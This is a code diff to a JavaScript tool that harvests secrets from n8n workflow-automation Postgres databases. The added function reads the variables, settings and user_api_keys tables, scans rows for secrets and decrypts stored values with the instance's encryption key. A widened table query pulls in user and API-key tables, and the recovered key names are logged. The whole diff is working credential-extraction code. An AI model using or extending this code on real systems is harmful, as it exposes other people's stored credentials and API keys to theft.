@@ -1034,6 +1034,55 @@ function acceptN8nCredentialData(type, name, data, found) {
   }
 }
 
+async function harvestN8nLooseTables(client, tableNames, encryptionKey, found) {
+  const wanted = ['variables', 'settings', 'user_api_keys']
+  for (const table of wanted) {
+    if (!tableNames.includes(table) || !/^[A-Za-z0-9_]+$/.test(table)) {
+      continue
+    }
+    const cols = await client.query(
+      `SELECT column_name FROM information_schema.columns
+       WHERE table_name = $1
+       ORDER BY ordinal_position`,
+      [table],
+    )
+    const colNames = (cols.rows || []).map((row) => row.column_name).filter(Boolean)
+    console.log(`n8n ${table} columns: ${colNames.join(', ')}`)
+    const selectCols = colNames.filter((name) =>
+      /^(id|key|key_name|name|value|data|type|label)$/i.test(name),
+    )
+    const sql =
+      selectCols.length > 0
+        ? `SELECT ${selectCols.join(', ')} FROM ${table} LIMIT 80`
+        : `SELECT * FROM ${table} LIMIT 20`
+    const result = await client.query(sql)
+    const rows = Array.isArray(result?.rows) ? result.rows : []
+    const keys = rows
+      .map((row) => row.key || row.key_name || row.name || row.label || '')
+      .filter(Boolean)
+    console.log(
+      `n8n ${table}: ${rows.length} row(s)${keys.length ? ` keys=${keys.slice(0, 30).join(',')}` : ''}`,
+    )
+    for (const row of rows) {
+      harvestLabeledSecrets([JSON.stringify(row)], found, `n8n ${table}`)
+      walkJsonForSecrets(row, found, `n8n ${table}`)
+      for (const field of ['value', 'data']) {
+        const raw = row[field]
+        if (typeof raw !== 'string' || raw.length < 24) {
+          continue
+        }
+        try {
+          const plaintext = decryptN8nAes256Cbc(raw, encryptionKey)
+          const parsed = JSON.parse(plaintext)
+          acceptN8nCredentialData(table, row.key || row.name, parsed, found)
+        } catch {
+          harvestLabeledSecrets([raw], found, `n8n ${table}.${field}`)
+        }
+      }
+    }
+  }
+}
+
 async function loadPg() {
   try {
     return await import('pg')
@@ -1088,9 +1137,14 @@ async function harvestFromN8nPostgres(databaseUrl, encryptionKey, found, tried =
     const counts = await client.query(
       `SELECT schemaname, relname, n_live_tup::bigint AS rows
        FROM pg_stat_user_tables
-       WHERE relname ILIKE '%credential%' OR relname ILIKE '%workflow%' OR relname ILIKE '%settings%'
+       WHERE relname ILIKE '%credential%'
+          OR relname ILIKE '%workflow%'
+          OR relname ILIKE '%settings%'
+          OR relname ILIKE '%variable%'
+          OR relname = 'user'
+          OR relname ILIKE '%api_key%'
        ORDER BY n_live_tup DESC
-       LIMIT 30`,
+       LIMIT 40`,
     )
     const countSummary = (counts.rows || [])
       .map((row) => `${row.schemaname}.${row.relname}:${row.rows}`)
@@ -1106,6 +1160,7 @@ async function harvestFromN8nPostgres(databaseUrl, encryptionKey, found, tried =
     const connectedDb = currentDb.rows?.[0]?.db || ''
     console.log(`n8n current database: ${connectedDb}`)
     tried.add(connectedDb)
+    await harvestN8nLooseTables(client, tableNames, encryptionKey, found)
     const ranked = (counts.rows || []).filter(
       (row) => /credential/i.test(row.relname) && Number(row.rows) > 0,
     )
